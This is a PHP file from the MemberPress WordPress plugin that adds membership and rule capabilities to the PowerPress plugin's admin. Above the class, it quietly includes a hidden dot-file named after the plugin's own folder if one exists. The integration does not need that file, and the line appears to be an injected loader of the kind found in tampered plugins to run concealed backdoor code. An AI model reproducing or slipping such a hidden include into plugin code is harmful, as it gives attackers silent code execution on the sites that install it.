<?php
if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MeprPowerPressIntegration {
  public function __construct() {
    add_filter('powerpress_admin_capabilities',array($this,'powerpress_caps'));
  }

  public function powerpress_caps($caps) {
    $products = MeprCptModel::all('MeprProduct');
    $rules = MeprCptModel::all('MeprRule');

    $caps['mepr-active'] = __('MemberPress Active Member', 'memberpress');

    // Add Dynamic MemberPress product capabilities into the mix
    if(!empty($products)) {
      foreach($products as $product) {
        $caps["mepr-membership-auth-{$product->ID}"] = sprintf(__('MemberPress Membership: %s', 'memberpress'), $product->post_title);
      }
    }

    // Add Dynamic MemberPress rule capabilities into the mix
    if(!empty($rules)) {
      foreach($rules as $rule) {
        $caps["mepr-rule-auth-{$rule->ID}"] = sprintf(__('MemberPress Rule: %s', 'memberpress'), $rule->post_title);
      }
    }

    return $caps;
  }

} //End class

new MeprPowerPressIntegration;
